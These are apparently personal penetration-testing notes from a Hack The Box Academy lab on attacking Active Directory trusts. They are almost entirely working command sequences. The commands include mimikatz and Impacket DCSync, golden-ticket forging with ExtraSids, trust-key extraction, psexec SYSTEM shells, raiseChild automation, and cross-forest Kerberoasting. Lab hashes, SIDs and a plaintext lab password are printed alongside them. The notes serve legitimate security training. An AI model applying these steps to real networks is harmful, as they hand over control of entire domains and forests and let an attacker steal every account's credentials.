# Content
- [Enumerating Trust Relationships](#enumerating-trust-relationships)
- [From child to parent Trusts Abuse](#from-child-to-parent-trusts-abuse)
  - [ExtraSids Attack](#extrasids-attack)
  - [Abusing Trust Account$](#abusing-trust-account)
  - [child to parent Kerberoasting](#child-to-parent-kerberoasting)
- [Cross-Forest Trust Abuse](#cross-forest-trust-abuse)
  - [Cross-Forest Kerberoasting](#cross-forest-kerberoasting)
  - [Admin Password Re-Use & Group Membership](#admin-password-re-use--group-membership)

# Enumerating Trust Relationships


## activedirectory
- ForestTransitive : mean outside the forest        
- IntraForest : mean inside the forest

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

## Powerview
```powershell
Import-Module ./powerview.ps1

Get-DomainTrust
Get-DomainTrustMapping

# check parent domain
Get-NetDomain -Domain INLANEFREIGHT.LOCAL

# Checking Users in the Trusted domains using Get-DomainUser
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

```

## netdom 
```powershell
# Using netdom to query domain trust
netdom query /domain:inlanefreight.local trust

# Using netdom to query domain controllers
netdom query /domain:inlanefreight.local dc

# Using netdom to query workstations and servers
netdom query /domain:inlanefreight.local workstation

# check if sid filtering enabled or not
netdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine 
netdom trust somedomain.com /domain:anotherdomain.com /quarantine

```


## BloodHound
- BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT

bloodhound 
```
![Screenshot 2024-07-08 at 03-30-53 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/52df1ad6-e669-47dc-a10a-5ba242815a78)


# From child to parent Trusts Abuse
- The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain.
- The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
- SID history is intended to work across domains, but can work in the `same domain`.
- **Case:** `LOGISTICS.INLANEFREIGHT.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `LOGISTICS.INLANEFREIGHT.LOCAL` 



## ExtraSids Attack
- This attack allows for the compromise of a parent domain once the child domain has been compromised.
- if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group
- then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.
- needs sid-filtring to be off

### Steps
- comprmised DC in a child domain
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz or any tool.

### Windows

1) **Obtaining the KRBTGT hash**
```powershell
mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
```
2) **Get child Domain SID**
```powershell
Get-DomainSID
```
3) **Obtaining Enterprise Admins Group's SID**
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
4) **Creating a Golden Ticket**
```powershell

# mimikatz
mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"

# Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
5) **Confirming a Kerberos Ticket is in Memory**
```powershell
klist
```

6) Performing a DCSync Attack against parent domain then we can forge golden ticket
```
.\mimikatz.exe "lsadump::dcsync" "/domain:INLANEFREIGHT.LOCAL" "/user:INLANEFREIGHT\lab_adm"

```




### Linux
1) **Obtaining the KRBTGT**
```shell
# this dsync
# child domain DC ip
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
2) **Get child Domain SID**

```shell
# from Impacket toolkit
# the ip of the DC of child domain 
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
3) **Obtaining Enterprise Admins Group's SID**
```shell
# from Impacket toolkit
# the ip of the DC of the parent DC
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
4) **Creating a Golden Ticket**
```shell
# from Impacket toolkit
# tha hash is krbtgt hash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials.
export KRB5CCNAME=hacker.ccache 
```
5) **Getting a SYSTEM shell**
```shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
6) **dump parent DC hashed**
```shell
# hashes is the admin hashe which we got from ticketer.py or raiseChild.py
secretsdump.py inlanefreight.local/administrator@172.16.5.5 -just-dc -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf 
```

#### we can use on tool to automate the proccess
**using raiseChild.py**

```shell
# from Impacket toolkit
# the ip of parent DC then the child domain user
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```



## Abusing Trust Account$  
- When an Active Directory domain or forest trust is set up from a domain B to a domain A (B trusts A), a trust account is created in domain A, named B$.
- Accessing Resources on a Trusted Domain (ex: LOGISTICS.INLANEFREIGHT.LOCAL) from a Trusting Domain (ex: INLANEFREIGHT.LOCAL)
- these hashes are for `INLANEFREIGHT.LOCAL\INLANEFREIGHT$` trusted account in trusted `LOGISTICS.INLANEFREIGHT.LOCAL` domain to access the trusting domain `INLANEFREIGHT.LOCAL` 

```powershell
mimikatz.exe "privilege::debug" "lsadump::trust  /patch"

# check the keys of the output for example

#current Domain LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS / S-1-5-21-3056178012-3972705859-491075245)
#Domain: INLANEFREIGHT.LOCAL(INLANEFREIGHT / S-1-5-21-2734290894-461713716-141835440)
# [  In ] INLANEFREIGHT.LOCAL -> LOGISTICS.INLANEFREIGHT.LOCAL 
#    * 18/08/2024 10:06:16 - CLEAR   - eb 02 61 8e f7 3e f6 e1 6f a1 d5 8c a1 0e df c1 8e a4 25 11 50 c9 e0 6a 66 dc 1a 43 15 fe 4f d6 b5 b2 4e 21 3b 40 07 8a 62 c7 e8 b4 9b 7f 4a 54 4d 63 d1 94 ee e0 00 1e e3 a7 #3e 49 ab d4 63 4b 5e cb 22 3d 42 9b 48 f8 3c 5a b8 ce 5f e8 4a 99 af f7 a0 f1 a5 a0 b2 15 bb 10 7c 84 50 9f dc 2c e0 3b b7 fa 9a 1c b2 bd 96 ee da 78 69 f7 a2 17 9b e3 51 e7 1c b6 c0 90 55 b9 7e dd 56 65 17 43 #17 f0 6d c4 10 a2 79 82 94 20 98 68 7a c9 6d ae 2d 03 01 9a d1 a7 8f 9d ae 29 e6 ad 3d 3a 20 0f e5 a8 5b e2 ba 8b 83 cb 98 ee 9e 4f 93 c6 12 1f c8 c3 7e e1 3e c9 be 93 4a 99 45 28 12 2f bc 97 92 37 31 7b 76 d1 #a4 82 ab 6c 4c 7f 8e e5 1c 1e c7 6d 5e 0d 4b 5e 0e b5 64 9f fc 96 e2 80 0e 72 77 ef 1b bc 1a ff 02 e7 55 ea e2 01 85 57 5c 31 
 #       * aes256_hmac       b4656adcc7f0e1b9b2bfa383ae098e3aaace8c59b4a756f54865336be1c934ae
 #       * aes128_hmac       d47a943e290e5e4ef58c1010f37b4e28
 #       * rc4_hmac_nt       ef3c6d05afaa2e14f307b03d6531e119

# 

# i used the keys here
.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:ef3c6d05afaa2e14f307b03d6531e119 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"

klist

# ask a ticket for a service
.\Rubeus.exe asktgs /rc4:9d765b482771505cbe97411065964d5f /service:CIFS/DC.INLANEFREIGHT.LOCAL /dc:DC.INLANEFREIGHT.LOCAL /ptt

```




## child to parent Kerberoasting

```
# Enumerating Accounts for Associated SPNs
Get-DomainUser -SPN -Domain INLANEFREIGHT.LOCAL | select SamAccountName

# Enumerating the mssqlsvc Account
Get-DomainUser -Domain INLANEFREIGHT.LOCAL -Identity mssqlsvc |select samaccountname,memberof

# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
.\Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /user:mssqlsvc /nowrap
```


# Cross-Forest Trust Abuse

## Cross-Forest Kerberoasting
**Case:** `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `INLANEFREIGHT.LOCAL` 

### Windows 

```powershell
# Enumerating Accounts for Associated SPNs
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Enumerating the mssqlsvc Account
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Linux 

```shell
# see spns
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# ask for TGS
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```

## Admin Password Re-Use & Group Membership
- We may also see users or admins from `Domain A` as members of a group in `Domain B`.
- Only `Domain Local Groups` allow security principals from outside its forest. and here is all built-in `Domain Local Groups`

| Group Name                        | Description                                                                    |
|-----------------------------------|--------------------------------------------------------------------------------|
| Administrators                    | Members have full control over the domain, including all domain controllers.   |
| Account Operators                 | Members can create, delete, and modify user accounts and groups, except for administrative accounts. |
| Backup Operators                  | Members can back up and restore files on domain controllers.                   |
| Print Operators                   | Members can manage printers in the domain.                                     |
| Server Operators                  | Members can log on to domain controllers and perform server management tasks.  |
| Incoming Forest Trust Builders    | Members can create incoming forest trusts to the domain.                       |
| Pre-Windows 2000 Compatible Access| Provides read access to all users and groups in the domain.                    |
| Guests                            | Limited access group for temporary accounts.                                   |
| Remote Desktop Users              | Members can remotely log on to domain controllers.                             |



- We may see a `Domain Admin` or `Enterprise Admin` from Domain A as a member of the `built-in Administrators` (which is Domain Local Group) in Domain B in a bidirectional forest trust relationship.
- **Case:** `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `INLANEFREIGHT.LOCAL` with comprmised `Domain admin` user and password reuse for another user in cross-forest



### Windows 

```powershell
# enumerate groups with users that do not belong to the domain
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
=>
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL


# get security princible name
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
=> INLANEFREIGHT\administrator



# auth to FREIGHTLOGISTICS.LOCAL using administrator cred 
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

```


### Linux 

```shell

bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
zip -r ilfreight_bh.zip *.json

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
zip -r FREIGHTLOGISTICS_bh.zip *.json
```

after that we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`
![Screenshot 2024-07-10 at 00-23-38 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/1cbdf3d6-3c7f-4114-aa4c-7eba525cdea6)
